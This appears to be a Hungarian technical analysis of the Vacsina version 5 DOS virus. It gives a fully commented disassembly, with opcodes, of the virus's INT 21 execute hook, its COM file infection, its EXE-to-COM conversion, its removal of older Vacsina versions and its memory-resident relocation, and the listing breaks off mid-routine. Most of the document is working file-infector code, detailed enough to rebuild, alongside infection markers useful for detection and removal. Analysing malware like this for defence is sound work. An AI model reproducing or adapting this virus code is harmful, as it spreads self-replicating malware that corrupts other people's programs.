
                                 ***************************
                                 * A Vacsina 5-îs verzi¢ja *
                                 ***************************

A v°rus a mem¢ri†ban val¢ elhelyezkedÇse Çs CS-e szerint van list†zva.

A v°rus hossza COM fileban 1206D-1221D, EXE fileban 132D, illetve 1338D-1353D by
						te.

Nem zenÇl, semmi k†rt nem tesz. (Csak a fileok idejÇt nem †ll°tja vissza. )

A fileokat a 4B DOS funkci¢ megh°v†sakor fertîzi meg.

Egy file fertîzîttsÇgÇt az utols¢ 8 byteb¢l †llap°tja meg. Bîvebb le°r†s†t l†sd 
						ott. Ki°rt†sa is
ez alapj†n tîrtÇnhet.

1206D-n†l hosszabb,62867D-nÇl rîvidebb,JMP-pal kezdîdî COM fileokat, valamint a 
						64947D-nÇl rîvidebb
EXE fileokat fertîzi.A COM fileokat paragrafushat†rra kerek°ti, majd a lejjebb l
						†that¢ form†ban
az egÇsz v°rust a mem¢riale°r¢ blokkj†val egyÅtt a filehoz m†solja. FertîzÇs ut†
						n egy bip hangot
hallat. A fertîzÇs idejÇre egy VACSINA nevÅ filet megnyit, de semmit sem csin†l 
						vele. Futtat†skor
az eredeti 3 byteot nem °rja vissza, hanem direkt oda ugrik, ahova a file elei J
						MP mutatott.
EXE filehoz, ha a headerje stimmel, 0039-tîl 0084 byteot fÅz (nincs kerek°tÇs). 
						Ez a rÇsz semmit
sem csin†l, csak futtatja az eredeti EXE-t. CÇlja, hogy EXE-bîl COM-ot csin†ljon
						,°gy a v°rus kÇsîbb
m†r megfertîzheti.êrdekes,hogy majdnem ugyanezt a k¢dsorozatot tal†ltam tîbb ere
						deti MS-DOS 3.10-†s
fileon (DEBUG,PRINT,...). Igy a v°rus°r¢ ezt a rÇszt (az EXE-k relok†l†s†t) inne
						n vette. FeltÇte-
lezem, hogy van egy olyan EXE2BIN program, ami nem relok†lhat¢ EXE-ket is COM-m†
						 alak°t. Innen
sz†rmazhat ez a k¢drÇszlet.

Azt, hogy m†r a mem¢ri†ban van-e a Vacsina a 0000:00C5-în ehelyezett 397F azonos
						°t¢sz¢b¢l †llapitja
meg. 0000:00C7-re helyezi a v°rus verzi¢sz†m†t.



FFF0 MLB           DB   4D        ;A v°rus egy kÅlîn mem¢riablokkban helyezkedik
						 el.
FFF1 MLB_GAZDA     DW   ?         ;Furcsa m¢don ezt is "cipeli" mag†val
FFF3 MLB_HOSSZ     DW   ?         ;Mem¢riablokk hossza paragrafusokban
FFF5               DB   0B DUP ?


     ;---------------------------------------------------------------
     ;                           V†ltoz¢k
     ;---------------------------------------------------------------

0000 ERE_INT21     DD   ?         ;INT 21 eredeti c°me
0004 ERE_INT24     DD   ?         ;INT 24 eredeti c°me
0008 F_ATTR        DW   ?         ;File eredeti attributtuma
000A HANDLE        DW   ?         ;File handle
000C BUFFER        DB   8 DUP (?) ;8 byte beffer


     ;              Egy szabv†nyos FCB

0014 FCB           DB   0                   ;Aktu†lis drive
0015               DB   'VACSINA    '       ;File nÇv
0020               DW   ?                   ;Kurrens blokk
0022               DW   ?                   ;Rekordhossz
0024               DD   ?                   ;File hossz
0028               DW   ?                   ;D†tum
002A               DW   ?                   ;Idî
002C               DB   8 DUP (?)           ;Lefoglalt
0034               DB   ?                   ;Rekordsz†m a blokkban
0035               DD   ?                   ;Random rekord


     ;------------------------------------------------------------------
     ;EXE filehoz csak az innentîl kezdîdî 0084 (132D) byteot °rja hozz†
     ;------------------------------------------------------------------

0039               DB   '                    '  ;20 db SPC

		   ORG  0045      ;ètfedÇs 0045-004C-ig

0045 KEZD_IP       DW   ?         ;ip kezdeti ÇrtÇke ez lesz
0047 KEZD_CS       DW   ?         ;cs kezdeti ÇrtÇke ez lesz
0049 KEZD_SP       DW   ?         ;sp kezdeti ÇrtÇke ez lesz
004B KEZD_SS       DW   ?         ;ss kezdeti ÇrtÇke ez lesz

     ;---------------------------------------------------------------
     ;                BelÇpÇsi pont eredetileg EXE filen†l
     ;---------------------------------------------------------------
     ;Ezzel a rÇsszel Çri el, hogy egy EXE file COM form†tum£ legyen Çs lehessen
						 fertîzni

004D E80000        CALL 0050
0050 5B          * POP  BX                  ;bx=0050
0051 50            PUSH AX
0052 8CC0          MOV  AX,ES
0054 051000        ADD  AX,0010             ;ax a program leendî elejÇre mutat
0057 8B0E0E01      MOV  CX,[010E]           ;Stack t†vols†g
005B 03C8          ADD  CX,AX               ;Mi lesz ss kezdeti ÇrtÇke
005D 894FFB        MOV  [BX-05],CX          ;KEZD_SS (004B)
0060 8B0E1601      MOV  CX,[0116]           ;K¢dterÅlet t†vols†ga
0064 03C8          ADD  CX,AX
0066 894FF7        MOV  [BX-09],CX          ;KEZD_CS (0047)
0069 8B0E1001      MOV  CX,[0110]           ;sp kezdeti ÇrtÇke
006D 894FF9        MOV  [BX-07],CX          ;KEZD_SP (0049)
0070 8B0E1401      MOV  CX,[0114]           ;ip kezdeti ÇrtÇke
0074 894FF5        MOV  [BX-0B],CX          ;KEZD_IP (0045)
0077 8B3E1801      MOV  DI,[0118]           ;Elsî reklok†ci¢s bejegyzÇs
007B 8B160801      MOV  DX,[0108]           ;Header hossza paragrafusban
007F B104          MOV  CL,04
0081 D3E2          SHL  DX,CL               ;Header hossza byteokban
0083 8B0E0601      MOV  CX,[0106]           ;Relok†ci¢s bejegyzÇsek sz†ma
0087 E317          JCXZ 00A0                ;Ugr†s, ha nincs mit relok†lni


     ;                       Relok†l†s ciklusa

0089 26          * ES:
008A C5B50001      LDS  SI,[DI+0100]        ;Hol kell relok†lni
008E 83C704        ADD  DI,+04              ;Kîvetkezî relok†ci¢s bejegyzÇs
0091 8CDD          MOV  BP,DS
0093 26            ES:
0094 032E0801      ADD  BP,[0108]           ;Header hossza paragrafusban
0098 03E8          ADD  BP,AX               ;ax=program (file) val¢di kezdete
009A 8EDD          MOV  DS,BP               ;Itt kell relok†lni
009C 0104          ADD  [SI],AX             ;Relok†ci¢
009E E2E9          LOOP 0089


     ;            Az †trelok†lt programot a helyÇre rakja

00A0 0E          * PUSH CS
00A1 1F            POP  DS                  ;ds=cs
00A2 BF0001        MOV  DI,0100
00A5 8BF2          MOV  SI,DX               ;dx=Header hossza byteokban
00A7 81C60001      ADD  SI,0100
00AB 8BCB          MOV  CX,BX               ;Mennyi byteot kell mozgatni ? (Ez e
						gy kicsit tîbb)
00AD 2BCE          SUB  CX,SI
00AF F3            REPZ
00B0 A4            MOVSB


     ;                    Az eredeti EXE program futtat†sa

00B1 58            POP  AX                  ;ax eredeti ÇrtÇke
00B2 FA            CLI
00B3 8E57FB        MOV  SS,[BX-05]          ;KEZD_SS
00B6 8B67F9        MOV  SP,[BX-07]          ;KEZD_SP
00B9 FB            STI
00BA FF6FF5        JMP  FAR [BX-0B]         ;KEZD_IP, KEZD_CS


     ;---------------------------------------------------------------
     ;               INT 24 (DOS kritikus hibakezelîje)
     ;---------------------------------------------------------------


00BD B003        * MOV	AL,03               ;DOS hib†t jelezzen
00BF CF            IRET


     ;---------------------------------------------------------------
     ;                  INT 21 (DOS belÇpÇsi pontja)
     ;---------------------------------------------------------------
     ;          Csak a 4B00 (EXECUTE) funkci¢n†l avatkozik kîzbe

00C0 9C          * PUSHF
00C1 3D004B        CMP	AX,4B00
00C4 7406          JZ	00CC
00C6 9D            POPF
00C7 2E            CS:
00C8 FF2E0000      JMP	FAR [0000]



     ;                     A DOS 4B00 alfunkci¢ja

00CC 06          * PUSH	ES                  ;bp+10
00CD 1E            PUSH	DS                  ;bp+0E
00CE 55            PUSH	BP                  ;bp+0C
00CF 57            PUSH	DI                  ;bp+0A
00D0 56            PUSH	SI                  ;bp+08
00D1 52            PUSH	DX                  ;bp+06
00D2 51            PUSH	CX                  ;bp+04
00D3 53            PUSH	BX                  ;bp+02
00D4 50            PUSH	AX                  ;bp+00
00D5 8BEC          MOV	BP,SP


     ;                     INT 24 lekÇrdezÇse, †t°r†sa

00D7 B82435        MOV	AX,3524             ;GET_INT_VECT (es:bx)
00DA CD21          INT	21
00DC 2E            CS:
00DD 8C060600      MOV	[0006],ES           ;ERE_INT24+2
00E1 2E            CS:
00E2 891E0400      MOV	[0004],BX           ;ERE_INT24
00E6 0E            PUSH	CS
00E7 1F            POP	DS
00E8 BABD00        MOV	DX,00BD
00EB B82425        MOV	AX,2524             ;SET_INT_VECT (ds:dx)
00EE CD21          INT	21


     ; A VACSINA nevÅ file megnyit†sa (val¢sz°nÅleg a v°rus nyomonkîvetÇse miatt
						)

00F0 0E            PUSH CS                  ;Megj.:felesleges
00F1 1F            POP  DS
00F2 BA1400        MOV  DX,0014
00F5 B40F          MOV  AH,0F               ;OPEN_FCB (ds:dx)
00F7 CD21          INT	21


     ;      File eredeti attributtum†nak lekÇrdezÇse, R/O bit tîrlÇse

00F9 B80043        MOV  AX,4300             ;GET_FILE_ATTR (cx)
00FC 8E5E0E        MOV  DS,[BP+0E]
00FF 8B5606        MOV  DX,[BP+06]
0102 CD21          INT  21
0104 7303          JNB  0109
0106 E9DA01        JMP  02E3                ;Hib†n†l
0109 2E          * CS:
010A 890E0800      MOV  [0008],CX           ;F_ATTR
010E B80143        MOV  AX,4301             ;SET_FILE_ATTR (cx)
0111 80E1FE        AND  CL,FE               ;R/O bit tîrlÇse
0114 CD21          INT  21
0116 7303          JNB  011B
0118 E9C801        JMP  02E3                ;Hib†n†l


     ;                      CÇlbavett file megnyit†sa
     ;      HIBA !!! A file eredeti idejÇt nem kÇrdezi le Çs nem †ll°tja vissza.

011B B8023D      * MOV  AX,3D02             ;OPEN_HANDLE (dx:dx)
011E 8E5E0E        MOV  DS,[BP+0E]
0121 8B5606        MOV  DX,[BP+06]
0124 CD21          INT  21
0126 7303          JNB  012B
0128 E9A801        JMP  02D3                ;Hib†n†l
012B 2E          * CS:
012C A30A00        MOV  [000A],AX           ;HANDLE
012F 8BD8          MOV  BX,AX


     ;              File elsî 6 bytej†nak beolvas†sa a BUFFER-be

0131 0E            PUSH CS
0132 1F            POP  DS
0133 BA0C00        MOV  DX,000C             ;offset BUFFER
0136 B90600        MOV  CX,0006             ;6 byte olvas†sa
0139 B43F          MOV  AH,3F               ;READ_HANDLE (bx,ds:dx,cx)
013B CD21          INT  21
013D 7219          JB   0158                ;Hib†n†l
013F 3D0600        CMP  AX,0006
0142 7514          JNZ	0158


     ;               EXE-e a kiszemelt file ?

0144 2E            CS:
0145 813E0C004D5A  CMP  WORD PTR [000C],5A4D;EXE file-e
014B 7503          JNZ	0150
014D E9B501        JMP	0305


     ;---------------------------------------------------------------
     ;                          COM file
     ;---------------------------------------------------------------

0150 2E          * CS:
0151 803E0C00E9    CMP	BYTE PTR [000C],E9  ;Csak akkor fertîzzÅk, ha JMP-pal kez
						dîdik
0156 7403          JZ	015B


     ;              SegÇdugr†s hib†n†l

0158 E96F01      * JMP  02CA


     ;                   1206D < file hossz < 62867D

015B B80242      * MOV  AX,4202             ;File vÇgÇre †ll†s
015E B90000        MOV  CX,0000
0161 8BD1          MOV  DX,CX
0163 2E            CS:
0164 8B1E0A00      MOV  BX,[000A]           ;HANDLE
0168 CD21          INT  21                  ;dx:ax=file hossz
016A 72EC          JB   0158                ;Hib†n†l
016C 83FA00        CMP	DX,+00
016F 75E7          JNZ	0158
0171 3DB604        CMP	AX,04B6
0174 76E2          JBE	0158
0176 3D93F5        CMP	AX,F593
0179 73DD          JNB	0158


     ;                   File adatainak elt†rol†sa

017B 2E            CS:
017C A39E04        MOV  [049E],AX           ;ERE_HOSSZ
017F 2E            CS:
0180 A10D00        MOV  AX,[000D]           ;File 2.,3. byteja
0183 050301        ADD  AX,0103             ;+ 0103
0186 2E            CS:
0187 A3A004        MOV  [04A0],AX           ;ERE_2_3


     ;              File utols¢ 8 bytej†nak beolvas†sa

018A B80242        MOV  AX,4202             ;File vÇge-8-dik poz°ci¢ra
018D B9FFFF        MOV  CX,FFFF
0190 BAF8FF        MOV  DX,FFF8
0193 2E            CS:
0194 8B1E0A00      MOV  BX,[000A]           ;HANDLE
0198 CD21          INT  21
019A 72BC          JB   0158                ;Hib†n†l
019C 2E            CS:
019D 8B1E0A00      MOV  BX,[000A]           ;HANDLE
01A1 0E            PUSH CS
01A2 1F            POP  DS
01A3 BA0C00        MOV  DX,000C             ;offset BUFFER
01A6 B90800        MOV  CX,0008             ;8 byte olvas†sa
01A9 B43F          MOV  AH,3F               ;READ_HANDLE (bx,ds:dx,cx)
01AB CD21          INT  21
01AD 72A9          JB   0158                ;Hib†n†l
01AF 3D0800        CMP  AX,0008
01B2 75A4          JNZ  0158                ;Hib†n†l


     ;                      Fertîzîtt-e m†r a file

01B4 2E            CS:
01B5 813E1000F47A  CMP  WORD PTR [0010],7AF4;Azonos°t¢sz¢
01BB 7577          JNZ  0234                ;MÇg nem ferîzîtt
01BD 2E            CS:
01BE 833E120005    CMP  WORD PTR [0012],+05 ;Verzi¢sz†m
01C3 90            NOP
01C4 7392          JNB  0158                ;Nem fertîzzÅk


     ;---------------------------------------------------------------
     ;        Egy kor†bbi Vacsina m†r megfertîzte (azt ki°rtja)
     ;---------------------------------------------------------------
     ;              Fertîzîtt file eredeti adatai

01C6 2E            CS:
01C7 A10C00        MOV  AX,[000C]           ;ERE_HOSSZ
01CA 2E            CS:
01CB A39E04        MOV  [049E],AX           ;ERE_HOSSZ
01CE 2E            CS:
01CF A10E00        MOV  AX,[000E]           ;ERE_2_3
01D2 2E            CS:
01D3 A3A004        MOV  [04A0],AX           ;ERE_2_3
01D6 2D0301        SUB  AX,0103
01D9 2E            CS:
01DA A30C00        MOV  [000C],AX           ;Eredeti 2.,3. byteja a filenak


     ;               File eredeti 2.,3. bytej†nak vissza°r†sa

01DD B80042        MOV  AX,4200             ;File 2. bytej†ra †ll
01E0 B90000        MOV  CX,0000
01E3 BA0100        MOV  DX,0001
01E6 2E            CS:
01E7 8B1E0A00      MOV  BX,[000A]           ;HANDLE
01EB CD21          INT  21
01ED 725F          JB   024E                ;Hib†n†l
01EF B440          MOV  AH,40               ;WRITE_HANDLE (bx,ds:dx,cx)
01F1 0E            PUSH CS
01F2 1F            POP  DS
01F3 BA0C00        MOV  DX,000C             ;offset BUFFER
01F6 B90200        MOV  CX,0002             ;2 byte °r†sa
01F9 CD21          INT  21
01FB 7251          JB   024E                ;Hib†n†l
01FD 3D0200        CMP  AX,0002
0200 754C          JNZ  024E                ;Hib†n†l


     ;              Directory bejegyzÇs aktualiz†l†sa

0202 2E            CS:
0203 8B1E0A00      MOV  BX,[000A]           ;HANDLE
0207 B445          MOV  AH,45               ;DUPLICATE_HANDLE (bx)
0209 CD21          INT  21
020B 7208          JB   0215                ;Hib†n†l
020D 8BD8          MOV  BX,AX
020F B43E          MOV  AH,3E               ;CLOSE_HANDLE (bx)
0211 CD21          INT  21
0213 7239          JB   024E                ;Hib†n†l


     ;                  File eredeti mÇretre v†g†sa

0215 B80042        MOV  AX,4200             ;File eredeti vÇgÇre †ll
0218 B90000        MOV  CX,0000
021B 2E            CS:
021C 8B169E04      MOV  DX,[049E]           ;ERE_HOSSZ
0220 2E            CS:
0221 8B1E0A00      MOV  BX,[000A]           ;HANDLE
0225 CD21          INT  21
0227 7225          JB   024E                ;Hib†n†l
0229 B440          MOV  AH,40               ;WRITE_HANDLE (bx,ds:dx,cx)
022B 0E            PUSH CS
022C 1F            POP  DS
022D B90000        MOV  CX,0000             ;Csonkol†s
0230 CD21          INT  21
0232 721A          JB   024E                ;Hib†n†l


     ;                       COM file megfertîzÇse
     ;               Filehossz kerek°tÇse paragrafushat†rra

0234 B80042      * MOV  AX,4200
0237 B90000        MOV	CX,0000
023A 2E            CS:
023B 8B169E04      MOV  DX,[049E]           ;ERE_HOSSZ
023F 83C20F        ADD  DX,+0F
0242 83E2F0        AND  DX,-10              ;Kerek°tÇs
0245 2E            CS:
0246 8B1E0A00      MOV  BX,[000A]           ;HANDLE
024A CD21          INT	21
024C 7303          JNB	0251


     ;                    SegÇdugr†s hib†n†l

024E EB7A        * JMP  02CA                ;Hib†n†l
0250 90            NOP


     ;    A v°rus mem¢riale°r¢ blokkj†val egyÅtt hozz†m†solja mag†t a filehoz

0251 2E            CS:
0252 8B1E0A00      MOV  BX,[000A]           ;HANDLE
0256 8CCA          MOV  DX,CS
0258 4A            DEC  DX
0259 8EDA          MOV  DS,DX               ;ds=cs-1 (mem.le°r¢ blokkra mutat)
025B BA0000        MOV  DX,0000
025E B9B604        MOV  CX,04B6             ;V°rus hossza (1206)
0261 B440          MOV  AH,40               ;WRITE_HANDLE (bx,ds:dx,cx)
0263 CD21          INT  21
0265 72E7          JB   024E                ;Hib†n†l
0267 3DB604        CMP  AX,04B6
026A 75E2          JNZ  024E                ;Hib†n†l


     ;              Directory bejegyzÇs aktualiz†l†sa

026C 2E            CS:
026D 8B1E0A00      MOV  BX,[000A]           ;HANDLE
0271 B445          MOV  AH,45               ;DUPLICATE_HANDLE (bx)
0273 CD21          INT  21
0275 7208          JB   027F                ;Hib†n†l
0277 8BD8          MOV  BX,AX
0279 B43E          MOV  AH,3E               ;CLOSE_HANDLE (bx)
027B CD21          INT  21
027D 72CF          JB   024E                ;Hib†n†l


     ;             File leendî elsî 3 bytej†nak kisz†m°t†sa

027F 2E            CS:
0280 C6060C00E9    MOV  BYTE PTR [000C],E9  ;JMP k¢dja
0285 2E            CS:
0286 8B169E04      MOV  DX,[049E]           ;ERE_HOSSZ
028A 83C20F        ADD  DX,+0F
028D 83E2F0        AND  DX,-10              ;Kerek°tÇs
0290 83EA03        SUB  DX,+03              ;-3 a JMP miatt
0293 81C2AC03      ADD  DX,03AC             ;BelÇpÇsi pont eltol†sa a file vÇgÇh
						ez kÇpest
0297 2E            CS:
0298 89160D00      MOV  [000D],DX           ;JMP operandusa


     ;                 File elsî 3 bytej†nak †t°r†sa

029C B80042        MOV  AX,4200             ;File elejÇre
029F B90000        MOV  CX,0000
02A2 8BD1          MOV  DX,CX
02A4 2E            CS:
02A5 8B1E0A00      MOV  BX,[000A]           ;HANDLE
02A9 CD21          INT  21
02AB 72A1          JB   024E                ;Hib†n†l
02AD 2E            CS:
02AE 8B1E0A00      MOV  BX,[000A]           ;HANDLE
02B2 0E            PUSH CS
02B3 1F            POP  DS
02B4 BA0C00        MOV  DX,000C             ;offset BEFFER
02B7 B90300        MOV  CX,0003             ;3 byte °r†sa
02BA B440          MOV  AH,40               ;WRITE_HANDLE (bx,ds:dx,cx)
02BC CD21          INT  21
02BE 728E          JB   024E                ;Hib†n†l
02C0 3D0300        CMP  AX,0003
02C3 7589          JNZ  024E                ;Hib†n†l


     ;            Egy BELL kiad†sa (Val¢sz°nÅleg ez a verzi¢ mÇg tesztpÇld†ny)

02C5 B8070E        MOV  AX,0E07             ;WRITE_TELETYPE
02C8 CD10          INT	10


     ;                        File lez†r†sa

02CA B43E        * MOV  AH,3E               ;CLOSE_HANDLE (bx)
02CC 2E            CS:
02CD 8B1E0A00      MOV  BX,[000A]           ;HANDLE
02D1 CD21          INT	21


     ;            File eredeti attributtum†nak vissza†ll°t†sa

02D3 B80143      * MOV  AX,4301             ;SET_FILE_ATTR (cx)
02D6 8E5E0E        MOV  DS,[BP+0E]          ;File nevÇre mutat
02D9 8B5606        MOV  DX,[BP+06]
02DC 2E            CS:
02DD 8B0E0800      MOV  CX,[0008]           ;F_ATTR
02E1 CD21          INT	21


     ;         A VACSINA nevÅ file lez†r†sa (£j d†tumot kap, semmi m†s)

02E3 0E          * PUSH CS
02E4 1F            POP	DS
02E5 BA1400        MOV	DX,0014             ;FCB
02E8 B410          MOV	AH,10               ;CLOSE_FCB
02EA CD21          INT	21


     ;               INT 24 vissza°r†sa, eredeti DOS funkci¢ h°v†sa

02EC B82425        MOV  AX,2524             ;SET_INT_VECT (ds:dx)
02EF 2E            CS:
02F0 C5160400      LDS  DX,[0004]           ;ERE_INT24
02F4 CD21          INT	21
02F6 58            POP	AX
02F7 5B            POP	BX
02F8 59            POP	CX
02F9 5A            POP	DX
02FA 5E            POP	SI
02FB 5F            POP	DI
02FC 5D            POP	BP
02FD 1F            POP	DS
02FE 07            POP	ES
02FF 9D            POPF
0300 2E            CS:
0301 FF2E0000      JMP	FAR [0000]          ;ERE_INT21


     ;---------------------------------------------------------------
     ;                    EXE file COM-m† alk°t†sa
     ;---------------------------------------------------------------
     ;                     file hossz < 64947D

0305 B80242      * MOV  AX,4202             ;File vÇgÇre †ll
0308 B90000        MOV  CX,0000
030B 8BD1          MOV  DX,CX
030D 2E            CS:
030E 8B1E0A00      MOV  BX,[000A]           ;HANDLE
0312 CD21          INT  21
0314 72B4          JB   02CA                ;Hib†n†l
0316 83FA00        CMP	DX,+00
0319 75AF          JNZ	02CA
031B 3DB3FD        CMP  AX,FDB3             ;64947D
031E 73AA          JNB	02CA


     ;                     Stimmel-e az EXE headerje?

0320 2E            CS:
0321 A39E04        MOV  [049E],AX           ;ERE_HOSSZ
0324 2E            CS:
0325 A11000        MOV  AX,[0010]           ;Filehossz lapokban
0328 48            DEC  AX
0329 B109          MOV  CL,09               ;* 512D
032B D3E0          SHL  AX,CL
032D 2E            CS:
032E 03060E00      ADD  AX,[000E]           ;+a maradÇk
0332 2E            CS:
0333 3B069E04      CMP  AX,[049E]           ;Egyezik-e a hosszal?
0337 7591          JNZ  02CA                ;Ha nem


     ;   A v°rus egy rÇszÇt hozz†fÅzi az EXE-hez (Igy COM lehet majd az EXE)

0339 2E            CS:
033A 8B1E0A00      MOV  BX,[000A]           ;HANDLE
033E B440          MOV  AH,40               ;WRITE_HANDLE (bx,ds:dx,cx)
0340 0E            PUSH CS
0341 1F            POP  DS
0342 BA3900        MOV  DX,0039             ;Innentîl
0345 B98400        MOV  CX,0084             ;132D byte ki°r†sa
0348 CD21          INT  21
034A 72C8          JB   0314                ;Hib†n†l
034C 3D8400        CMP  AX,0084
034F 75E6          JNZ  0337                ;Hib†n†l


     ;              Directory bejegyzÇs aktualiz†l†sa

0351 2E            CS:
0352 8B1E0A00      MOV  BX,[000A]           ;HANDLE
0356 B445          MOV  AH,45               ;DUPLICATE_HANDLE (bx)
0358 CD21          INT  21
035A 7208          JB   0364                ;Hib†n†l
035C 8BD8          MOV  BX,AX
035E B43E          MOV  AH,3E               ;CLOSE_HANDLE (bx)
0360 CD21          INT  21
0362 72B0          JB   0314                ;Hib†n†l


     ;                  File eljÇre

0364 B80042        MOV  AX,4200
0367 B90000        MOV	CX,0000
036A 8BD1          MOV	DX,CX
036C 2E            CS:
036D 8B1E0A00      MOV  BX,[000A]           ;HANDLE
0371 CD21          INT  21
0373 729F          JB   0314                ;Hib†n†l


     ;             Leendî elsî 3 byte kisz†m°t†sa

0375 2E            CS:
0376 C6060C00E9    MOV  BYTE PTR [000C],E9  ;JMP k¢dja
037B 2E            CS:
037C A19E04        MOV  AX,[049E]           ;ERE_HOSSZ
037F 051100        ADD  AX,0011             ;0039+0011+3=004D a belÇpÇsi pont
0382 2E            CS:
0383 A30D00        MOV  [000D],AX           ;JMP operandusa


     ;                Az elsî 3 byte felÅl°r†sa

0386 2E            CS:
0387 8B1E0A00      MOV  BX,[000A]           ;HANDLE
038B B440          MOV  AH,40               ;WRITE_HANDLE
038D 0E            PUSH CS
038E 1F            POP  DS
038F BA0C00        MOV  DX,000C             ;offset BUFFER
0392 B90300        MOV  CX,0003             ;3 byte °r†sa
0395 CD21          INT  21                  ;COM t°pus£ lesz a file
0397 E930FF        JMP  02CA                ;VÇge
                             ;Megj.:Ha itt egy JMP 0150 †llna egybîl fertîzhetne
						 EXE-t


     ;---------------------------------------------------------------
     ;                   V†ltoz¢ (ax eredeti ÇrtÇke)
     ;---------------------------------------------------------------

039A ERE_AX        DW   ?


     ;---------------------------------------------------------------
     ;                   BelÇpÇsi pont COM programn†l

     ;---------------------------------------------------------------

039C E80000      * CALL 039F
039F 5B          * POP	BX                  ;bx=039F
03A0 2E            CS:
03A1 8947FB        MOV	[BX-05],AX          ;ERE_AX (039A)


     ;       Annak eldîntÇse, hogy a mem¢ri†ban ven-e m†r Vacsina

03A4 B80000        MOV	AX,0000
03A7 8EC0          MOV	ES,AX
03A9 26            ES:
03AA A1C500        MOV  AX,[00C5]           ;INT 31 vektor†nak 2.,3. byteja
03AD 3D7F39        CMP  AX,397F             ;Van-e m†r Vacsina a mem¢ri†ban ?
03B0 7508          JNZ  03BA                ;Ugr†s, ha mÇg nem.
03B2 26            ES:
03B3 A0C700        MOV  AL,[00C7]           ;Mem¢ri†ban lÇvî v°rus verzi¢sz†ma
03B6 3C05          CMP  AL,05               ;Ennek a v°rusnak a verzi¢sz†ma
03B8 7332          JNB  03EC                ;Ugr†s, ha £jjabb vagy ez a verzi¢


     ;                            Van-e elÇg szadab mem¢ria

03BA 8BD4        * MOV  DX,SP
03BC 2BD3          SUB	DX,BX
03BE 81EA6C0B      SUB	DX,0B6C
03C2 7228          JB   03EC                ;Ugr†s, ha nincs elÇg szabad mem¢ria


     ;A v°rus kÅlîn mem¢riablokkba fog kerÅlni, aminek le°r¢ blokkja a v°rus elî
						tt helyezkedik el.
     ;Ennek a mem¢riablokknak hossz†t †ll°tja itt be.

03C4 BAC504        MOV  DX,04C5             ;V°rus †ltal igÇnyelt mem¢ria + 0F
03C7 B104          MOV  CL,04
03C9 D3EA          SHR  DX,CL               ;DIV 10
03CB 2E            CS:
03CC 899754FC      MOV  [BX+FC54],DX        ;MLB_HOSSZ (FFF3) Mem¢riale°r¢ blokk
						 hossza


     ;            A v°rus h†trÇbb m†solja mag†t (004C paragrafussal)

03D0 8CD9          MOV  CX,DS
03D2 03D1          ADD	DX,CX
03D4 8EC2          MOV  ES,DX               ;Ide kell h†trÇbbmozgatni mindent
03D6 8BF3          MOV  SI,BX
03D8 81C651FC      ADD  SI,FC51             ;si=FFF0 (v°rus a hozz† csatolt mem¢
						riale°r¢ blokkal)
03DC 8BFE          MOV  DI,SI               ;Ugyanilyen offsetÅ helyre m†sol
03DE B9B604        MOV  CX,04B6             ;V°rus hossza
03E1 FC            CLD
03E2 F3            REPZ
03E3 A4            MOVSB


     ;               A vezÇrlÇs †tkerÅl a "m†solat" v°rusra

03E4 06            PUSH ES
03E5 E80300        CALL	03EB
03E8 EB13          JMP	03FD                ;es:03FD-n folytat¢dik
03EA 90            NOP
03EB CB          * RETF


     ;                    Az eredeti program futtat†sa

03EC 8CC8        * MOV	AX,CS
03EE 8ED8          MOV	DS,AX               ;Szegmensregiszterek be†ll°t†sa
03F0 8EC0          MOV	ES,AX
03F2 8ED0          MOV	SS,AX
03F4 2E            CS:
03F5 8B47FB        MOV	AX,[BX-05]          ;ERE_AX (039A)
03F8 2E            CS:
03F9 FFA70101      JMP	[BX+0101]           ;ERE_2_3 (04A0) Hol kezdîdîtt az ered
						eti program?


     ;       Ide kerÅl a vezÇrlÇs a m†r lem†solt v°rusban (03E8-r¢l)
     ;   Az eredeti programot, PSP-jÇt, mem.le°r¢ blokkj†t is h†trÇbb mozgatjuk

03FD BE0000      * MOV	SI,0000             ;Megj.: felesleges
0400 BF0000        MOV	DI,0000
0403 8BCB          MOV	CX,BX               ;bx=039F
0405 81C161FC      ADD	CX,FC61             ;cx=0000  (eredeti program+PSP+mem.le
						°r¢ blokk hossza)
0409 8CC2          MOV	DX,ES
040B 4A            DEC	DX
040C 8EC2          MOV	ES,DX               ;szegmens--, mert a mem.le°r¢ blokkot
						 is m†soljuk
040E 8CDA          MOV	DX,DS
0410 4A            DEC	DX
0411 8EDA          MOV	DS,DX
0413 03F1          ADD	SI,CX
0415 4E            DEC	SI                  ;VisszafelÇ m†solunk azÇrt kell
0416 8BFE          MOV	DI,SI
0418 FD            STD
0419 F3            REPZ
041A A4            MOVSB
041B FC            CLD


     ;                    H†trÇbbmozgat†s dokument†l†sa

041C 2E            CS:
041D 8B9754FC      MOV	DX,[BX+FC54]        ;MLB_HOSSZ=4C Virus †ltal lefoglalt m
						em¢riablokk hossza
0421 26            ES:
0422 29160300      SUB	[0003],DX           ;Az eredeti program mem.blokkj†nak cs
						îkkentÇse
0426 26            ES:
0427 8C0E0100      MOV	[0001],CS           ;Uj gazda


     ;             V°rus visszam†sol†sa a szabadd† tett helyre

042B BF0000        MOV	DI,0000
042E 8BF3          MOV	SI,BX               ;bx=039F
0430 81C651FC      ADD	SI,FC51             ;FFF0  V°rus kezdete (mem.le°r¢ blokk
						al egyÅtt)
0434 B9B604        MOV	CX,04B6
0437 1E            PUSH	DS
0438 07            POP	ES                  ;V°sszam†solunk
0439 0E            PUSH	CS
043A 1F            POP	DS                  ;es=ds ; ds=cs
043B F3            REPZ
043C A4            MOVSB


     ;                  EgyÇb teendîk (az £j PSP miatt)

043D 26            ES:
043E 832E030001    SUB	WORD PTR [0003],+01 ;A mem.le°r¢ blokk hossz†t nem kell s
						z†molni!
0443 53            PUSH	BX
0444 8CCB          MOV	BX,CS
0446 B450          MOV	AH,50               ;SET_PSP (bx)
0448 CD21          INT	21
044A 5B            POP	BX
044B 2E            CS:
044C 8C0E3600      MOV	[0036],CS           ;PSP-n belÅl a gazda mehat†roz†sa
0450 2E            CS:
0451 8B162C00      MOV	DX,[002C]           ;Environment szegmense
0455 4A            DEC	DX
0456 8EC2          MOV	ES,DX               ;Environment mem.le°r¢ blokkja
0458 26            ES:
0459 8C0E0100      MOV	[0001],CS           ;Uj gazda


     ;                  INT 21 lekÇrdezÇse Çs †t°r†sa

045D B82135        MOV	AX,3521             ;GET_INT_VECT (es:bx)
0460 53            PUSH	BX
0461 CD21          INT	21
0463 36            SS:
0464 8C060200      MOV	[0002],ES           ;ERE_INT21+2
0468 36            SS:
0469 891E0000      MOV	[0000],BX           ;ERE_INT21
046D 5B            POP	BX
046E B82125        MOV	AX,2521             ;SET_INT_VECT (ds:dx)
0471 8CD2          MOV	DX,SS
0473 8EDA          MOV	DS,DX
